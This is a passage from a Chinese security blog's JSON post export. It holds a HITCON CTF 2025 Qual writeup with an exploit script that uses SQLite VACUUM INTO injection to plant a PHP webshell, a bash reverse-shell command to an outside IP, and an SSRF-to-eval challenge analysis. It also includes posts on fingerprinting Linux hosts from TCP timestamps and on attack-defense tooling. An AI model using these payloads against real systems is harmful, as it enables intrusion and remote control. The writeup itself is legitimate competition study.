style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;ls -t\u0026gt;x\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/z.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;\u0026gt;a.php\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;\\`\\$_GET[0]\\`;\u0026#39;\u0026#39;\\\\\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;echo \u0026#39;\u0026#39;\u0026lt;?=\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/cz.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/mz.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ebash exploit.sh http://orange.chal.hitconctf.com d9b7c60822d381105ce4452d0c770ce3\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e這樣 webshell 就完成了\u003c/p\u003e\n\u003cp\u003e因為 \u003ccode\u003e/read_flag\u003c/code\u003e 要解數學題所以接著彈 reverse shell 出來\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ecurl \u0026quot;http://orange.chal.hitconctf.com/sandbox/d9b7c60822d381105ce4452d0c770ce3/a.php?0=$(urlencode 'bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/160.187.198.4/22222 0\u0026gt;\u0026amp;1\u0026quot;')\u0026quot;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然後原本以為這樣就結束了，結果發現因為 \u003ccode\u003e/read_flag\u003c/code\u003e 沒有 flush stdout RRRRR\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/d6d0ec87-8d5e-4940-b60a-23f5c269ade4\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e當時因為是大半夜我很想睡覺所以有點暴躁\u003c/p\u003e\n\u003cp\u003e總之花了一些時間想辦法在 reverse shell 上搞一個 pty 出來（我就爛之前沒這樣弄過 QQ）\u003c/p\u003e\n\u003cp\u003e後來是 \u003ca href=\"https://pwn2ooown.tech/\"\u003epwn2ooown\u003c/a\u003e 幫忙成功用 \u003ccode\u003escript -qc /bin/bash /dev/null\u003c/code\u003e 開一個 pty 出來讀 flag 才結束\u003c/p\u003e\n\u003cp\u003e事後 \u003ca href=\"https://pwn2ooown.tech/\"\u003epwn2ooown\u003c/a\u003e 表示\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/bfafab19-c815-427f-a0b0-b4ccdf837a4f\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後我結束後問一坨人怎解的他們說直接用 webshell 爆他乘法的答案，\u003cdel\u003e這邊就很想問 \u003ca href=\"https://blog.orange.tw/\"\u003eorange\u003c/a\u003e 這是不是 intended\u003c/del\u003e\u003c/p\u003e\n\u003ch2 id=\"no-mans-echo\"\u003eNo Man\u0026rsquo;s Echo\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/0c2835be-c200-48c0-b158-848f640b06fb\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e題目長這樣\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e                                                                                                                                                                                                                    $probe \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eint\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e$_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;probe\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $range \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erange\u003c/span\u003e($probe, $probe \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eshuffle\u003c/span\u003e($range);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eforeach\u003c/span\u003e ($range \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e $k \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e $port) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                $target \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tcp://%s:%d\u0026#34;\u003c/span\u003e, $_SERVER[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;SERVER_ADDR\u0026#39;\u003c/span\u003e], $port);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                $fp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003estream_socket_client\u003c/span\u003e($target, $errno, $errstr, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e$fp) \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003estream_set_timeout\u003c/span\u003e($fp, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003efwrite\u003c/span\u003e($fp, \u003cspan style=\"color:#a6e22e\"\u003efile_get_contents\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;php://input\u0026#34;\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            $data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efgets\u003c/span\u003e($fp);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estrlen\u003c/span\u003e($data) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                $data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson_decode\u003c/span\u003e($data);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eisset\u003c/span\u003e($data\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esignal\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e $data\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esignal\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Arrival\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003eeval\u003c/span\u003e($data\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003elogogram\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003efclose\u003c/span\u003e($fp);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ehighlight_file\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003e__FILE__\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e基本上就是裸的 SSRF 但是只能控 port 而且 destination ip 永遠是 \u003ccode\u003e$_SERVER['SERVER_ADDR']\u003c/code\u003e 基本上就當作是 \u003ccode\u003elocalhost\u003c/code\u003e 就好，要想辦法讓他 SSRF 後收到惡意且指定格式的 json 裡面有 php 指令來 RCE，那這樣怎麼辦呢？不可能憑空在伺服器電腦上開 port 吧！\u003c/p\u003e\n\u003cp\u003e這時候有一點網路基礎的人就應該要直接聯想到可以做 TCP Simultaneous Open，簡單來說就是開兩個 tcp client 然後讓他們做 p2p 的連線。\u003c/p\u003e\n\u003cp\u003e基本上想法就是開兩個 client 然後想辦法讓這兩個 client 的 source port 剛好等於對方的 destination port 就好，但因為 source port 通常是不可控的，所以理論上要炸，為了可以比較穩並的炸出來，之前在研究 tcp timestamp 的時候有看到 port 在 linux 上的生成算法其實也是類似的方式生成的\u003c/p\u003e\n\u003cp\u003e有興趣可以\u003ca href=\"https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/\"\u003e參考這篇文章\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e所以整個思路就是\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e先連到他的 web server 錄 tcp 封包\u003c/li\u003e\n\u003cli\u003e找出他的 tcp seq 然後算出他的 \u003ccode\u003enet_secret\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e用 \u003ccode\u003enet_secret\u003c/code\u003e + ip 預估出可能會出現的 port range\u003c/li\u003e\n\u003cli\u003erace\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e但是因為現在時間已經是講課前一天，\u003cdel\u003e我她媽一題 CTF 題目都沒生出來連梗都沒想到\u003c/del\u003e，所以我只好把寫 exploit 的公作外包給 \u003ca href=\"https://pwn2ooown.tech/\"\u003epwn2ooown\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/c2932217-d125-40dc-9322-7b6088872dab\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e結果 \u003ca href=\"https://pwn2ooown.tech/\"\u003epwn2ooown\u003c/a\u003e 表示\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/7bee4856-c2d4-48bf-90b3-14e3fdcc549c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e好喔，看來我想太難了W\u003c/p\u003e\n\u003ch2 id=\"其他隊友的-writeup\"\u003e其他隊友的 writeup\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://hackmd.io/@Vincent550102/SJdfWT_Feg\"\u003eHackmd\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e最後題外話，後來我出了一題 ARP Spoofing 一題 TLS MITM 還用 instancer 包的漂漂亮亮的結果沒人解，我真的很難過QQQQ\u003c/p\u003e\n\u003cp\u003e文章最後來補個 \u003ca href=\"https://blog.vincent55.tw/\"\u003eVincent\u003c/a\u003e 表示要 1 個打 100 個的宣言\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/7193dc8a-7911-4ee4-a414-8b28db8db144\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/0fa5099e-fc0d-4478-9dea-2f6e3dc8ffc5\" alt=\"image\"\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/hitconctf-2025-qual/","title":"HITCON CTF 2025 Qual Writeup"},{"content":"\u003ch1 id=\"利用-tcp-的-timestamps-做到分類來源-linux-machine\"\u003e利用 TCP 的 Timestamps 做到分類來源 linux machine\u003c/h1\u003e\n\u003ch2 id=\"緣由\"\u003e緣由\u003c/h2\u003e\n\u003cp\u003e會做這個的原因是因為要打今年的 \u003ca href=\"/blogs/ais3-eof-2025/\"\u003eAIS3 EOF\u003c/a\u003e 要做封包的分析工具，然而按照 \u003ca href=\"/blogs/hitconctf-2024-final/\"\u003eHITCON CTF\u003c/a\u003e 與往年 AIS3 EOF 的經驗，我們是沒辦法取得每個隊伍的 SRC IP 的，也就是說無法辨識出這個 request 是屬於哪一個隊伍的。\u003c/p\u003e\n\u003cp\u003e這會造成甚麼問題，假設有一個 HTTP Post Auth 的 RCE 好了，可能會需要這些流程。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e註冊\u003c/li\u003e\n\u003cli\u003e登入\u003c/li\u003e\n\u003cli\u003e前置設定\u003c/li\u003e\n\u003cli\u003eRCE\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e如果是走 HTTP/1.0 這樣至少會有 4 個 connection，沒辦法辦識的話在 source port 都不同的情況下要光看這個 pcap 幾乎是很難直接看出這個漏洞怎觸發的，因為我們可能可以用 flag 去 filter 出 RCE 的 connection 但是沒辦法知道前面有哪些動作（註冊、登入、前置動作）。\u003c/p\u003e\n\u003cp\u003e為了解決這個問題開始研究 TCP header 與 IP header 的一些 field 有沒有可以利用的，而這邊又有一些限制，因為拿到的 pcap 的 TCP 有可能不是完整的 connection，可能會沒有 SYN 包，如果用只有 SYN 才有的 field 去過濾會不太精準。\u003c/p\u003e\n\u003ch2 id=\"正題\"\u003e正題\u003c/h2\u003e\n\u003cp\u003e原本會去看 Timestamp 是因為想說有沒有可能用 TCP 的 RTT 來分類隊伍，但是意外發現了很有趣的特性，首先來看看這個封包\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/1bf4cb92-14d1-4c37-b8dc-837f16cbf4f8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e我們有 TSVal: 871787126 如果用 unix timestamp 轉成時間的話會發現\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/0cea336b-3efc-4121-ad2e-d733b65e610c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這個時間好像怪怪的，可能是有某種 offset 在，因此去稍微看一下 \u003ca href=\"https://github.com/torvalds/linux\"\u003elinux kernel\u003c/a\u003e 是如何實作這個 TCP timestamp 的部分。\u003c/p\u003e\n\u003cp\u003e慢慢地來追一下 code\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/torvalds/linux/blob/87a132e73910e8689902aed7f2fc229d6908383b/net/ipv4/tcp_output.c#L1333\"\u003e__tcp_transmit_skb\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/torvalds/linux/blob/87a132e73910e8689902aed7f2fc229d6908383b/net/ipv4/tcp_output.c#L853\"\u003etcp_syn_options\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/torvalds/linux/blob/87a132e73910e8689902aed7f2fc229d6908383b/net/ipv4/tcp_output.c#L999\"\u003etcp_established_options\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e我們可以發現他使用了 \u003ccode\u003etp-\u0026gt;tsoffset\u003c/code\u003e 作為他的 offset，那這個 \u003ccode\u003etp-\u0026gt;tsoffset\u003c/code\u003e 是怎算出來的呢？\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/torvalds/linux/blob/87a132e73910e8689902aed7f2fc229d6908383b/net/ipv4/tcp_ipv4.c#L331\"\u003etcp_v4_connect\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/torvalds/linux/blob/87a132e73910e8689902aed7f2fc229d6908383b/net/core/secure_seq.c#L121\"\u003esecure_tcp_ts_off\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e這邊會發現它會使用 \u003ccode\u003ets_secret\u003c/code\u003e 這個 \u003ccode\u003ets_secret\u003c/code\u003e 基本上就是這台機器開機後第一次打 tcp connection 的時候就會隨機生成。\u003c/p\u003e\n\u003cp\u003e然後他會拿這個 \u003ccode\u003ets_secret\u003c/code\u003e 與 \u003ccode\u003esource ip\u003c/code\u003e 跟 \u003ccode\u003edestination ip\u003c/code\u003e 算一個 hash 出來做為 offset\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-C\" data-lang=\"C\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ets_secret_init\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esiphash_2u32\u003c/span\u003e((__force u32)saddr, (__force u32)daddr,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003ets_secret);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e這下有趣了，每台機器的 \u003ccode\u003ets_secret\u003c/code\u003e 基本上都是不同的，加上 source ip 不一定會相同，而且我們隊伍同一個 challenge 的 destination ip 絕對是相同的，這代表如果可以忽略掉時間，\u003cstrong\u003e我們可以利用這個 offset 分類出這台機器到我們服務的所有 connection\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e這邊做一下驗證\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/fb81c5df-620b-4fcb-8209-61520af3171c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/124e1eb9-ff40-4738-9a89-962fe966399d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/26e2f2e6-9c3e-426c-9a2b-993f92721345\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/5d257381-5153-4686-8934-d84f8d43746b\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/8af7c009-e5d0-4ae2-9f65-5c4e2c0219d6\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/de697614-0ba5-4a98-8fd4-186a04715fdd\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/e160edbf-1427-4786-8f2e-5b86b0e5ae93\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/e20673eb-0fb8-4ef9-9fbb-50c10974069b\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e因為一 round 大約 5 分鐘，所以我取前 3 位 hex 作為 user id\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/fdfd99eb-3d89-4af1-97fc-c46041e92079\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這樣一來就可以完美的分類出同一台來源 linux 機器的所有 tcp connection，比如 NAS 題的登入後 LFI 我完全只看 PCAP 就看出來了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/f74d9de9-6c0d-45c6-bf16-2c2e763479ea\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/ef1d75a3-4562-466b-8ed7-9d72187eb868\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e甚至於 passive mode ftp 的 control port 跟 transfer port 的 connection 也能完美對應出來。\u003c/p\u003e\n\u003cp\u003e這導致我們這隊看封包方面上幾乎跟開外掛一樣XXD\u003c/p\u003e\n\u003cp\u003e\u003cdel\u003e希望明年比賽不會把 tcp header 的 field 抹掉\u003c/del\u003e\u003c/p\u003e\n","description":"","image":"","permalink":"https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/","title":"利用 TCP 的 Timestamps 做到精準分類來源 linux machine"},{"content":"\u003ch1 id=\"hitcon-ctf-2024-final-心得\"\u003eHITCON CTF 2024 Final 心得\u003c/h1\u003e\n\u003cp\u003e這波 EOF 自幹全套 A\u0026amp;D 工具兼首次實戰測試大成功，只差 ELK 沒整併進來了，但能夠把上次 HITCON CTF 的一些想法實現出來也是很不錯。\u003c/p\u003e\n\u003cp\u003eround alert 實在方便甚至跳通知比視覺化快，讓 葉東逸 跟 vincent55 可以用最快速度登入 game 完成任務。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/1f733fb5-aa4b-4630-995e-7e9bb8c43b47\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eattack manager 第一天運行的很完美，舒服的顯示哪一隊這輪有打穿，這樣就能迅速應對更新 exploit 。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/ef8e4bbe-0b84-4e10-bfba-f58b546e0663\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003epcap analysis 也是完美的將所有的流量整理好，也完美的分類每台電腦的流量，只可惜還是需要導入 elk 才能看。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/a481b619-c2cb-4ce9-8e4e-a8e8705be99e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003epatch manager 第一天壞掉所以一直修，但是好險第一天沒有太多人在 patch，當天晚上將他修好測好以後第二天就完美運行，讓 三角蛇 可以快樂追 patch。但是最可惜的是賽前 WeakGod Chiu 準備的 binary diff 沒有用到。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/35687ed3-9e9a-4d8f-816e-a28733fddd84\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/352f3f21-1ace-4ea8-8f9d-7ddb8b704fe3\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e另外我們的超讚 crypto jeopardy 隊友 李彥佑 也是第一天就解完了超讚的。\u003c/p\u003e\n\u003cp\u003e另外第一次試著戴一台小 server 來充當 router 兼 NAS 也是一個蠻成功的，畢竟能夠內網傳檔案也不用在自己電腦接 vpn 去比賽環境還是比較方便的。\u003c/p\u003e\n\u003cp\u003e最後有些人問我為啥不用現成的，要客製化自己想要的功能直接自幹肯定是最快的對ㄅ（X\u003c/p\u003e\n\u003cp\u003e最後感謝 楊竣鴻 幫我寫前端♥️\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/95614bac-cf9e-4a92-84a7-fd04502ce0f0\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/3075e49b-1a67-43e2-95a3-b84c8fce7684\" alt=\"image\"\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/ais3-eof-2025/","title":"AIS3 EOF 2025 Final 心得"},{"content":"\u003ch1 id=\"交大碩士推甄\"\u003e交大碩士推甄\u003c/h1\u003e\n\u003cp\u003e今年大四要弄推甄，由於我覺得全台灣在網路與資安的資源上最好的會是交大，然後我覺得台大投不上，我在校成績 80%，所以我就只有投交大。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/7969e84b-b313-461c-ad69-ae398b4f17d3\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch2 id=\"書審\"\u003e書審\u003c/h2\u003e\n\u003cp\u003e這次記取我過去特選寫的\u003ca href=\"/doc/%E5%A4%A7%E5%AD%B8%E5%82%99%E5%AF%A9.pdf\"\u003e爛備審\u003c/a\u003e的教訓，這次稍微參考別人一些人的寫法用條列式把重點寫上去就好，雖說沒有甚麼美編的元素在，但是比較有重點。\u003c/p\u003e\n\u003cp\u003e\u003ca 